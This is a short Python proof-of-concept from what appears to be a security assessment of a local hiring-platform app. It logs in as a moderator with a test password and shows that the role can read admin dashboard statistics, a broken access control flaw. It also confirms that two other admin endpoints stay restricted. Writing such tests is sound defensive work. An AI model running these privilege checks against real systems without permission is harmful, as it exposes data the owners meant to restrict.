"""
WSTG-CONF-05: Moderator Access to Admin Dashboard
Demonstrates that the moderator role can access the admin dashboard endpoint,
which exposes platform-wide statistics intended only for admin/superadmin.
Expected: 200 response with dashboard stats when authenticated as moderator.
"""
import requests

BASE = "http://localhost:3000"

# Step 1: Login as moderator
login = requests.post(f"{BASE}/api/auth/login", json={
    "email": "carol.mod@hireflow.com",
    "password": "password123"
})
token = login.json()["token"]
role = login.json()["user"]["role"]
print(f"[+] Logged in as: {login.json()['user']['email']} (role: {role})")

# Step 2: Access admin dashboard
resp = requests.get(f"{BASE}/api/admin/dashboard", headers={
    "Authorization": f"Bearer {token}"
})
print(f"[+] GET /api/admin/dashboard")
print(f"    Status: {resp.status_code}")

if resp.status_code == 200:
    stats = resp.json().get("stats", {})
    print(f"    Total users: {stats.get('total_users')}")
    print(f"    Active contracts: {stats.get('active_contracts')}")
    print(f"    Total contracts: {stats.get('total_contracts')}")
    print(f"    Revenue this month: {stats.get('revenue_this_month')}")
    print(f"    Pending disputes: {stats.get('pending_disputes')}")

# Step 3: Verify other admin endpoints are restricted
admin_users = requests.get(f"{BASE}/api/admin/users", headers={
    "Authorization": f"Bearer {token}"
})
admin_settings = requests.get(f"{BASE}/api/admin/settings", headers={
    "Authorization": f"Bearer {token}"
})
print(f"\n[+] Access control check:")
print(f"    /api/admin/users: {admin_users.status_code} - {admin_users.json().get('error', 'OK')}")
print(f"    /api/admin/settings: {admin_settings.status_code} - {admin_settings.json().get('error', 'OK')}")

assert resp.status_code == 200, "Expected 200 for dashboard"
assert "stats" in resp.json(), "Expected stats in response"
print(f"\n[VULNERABLE] Moderator can access admin dashboard with platform statistics")
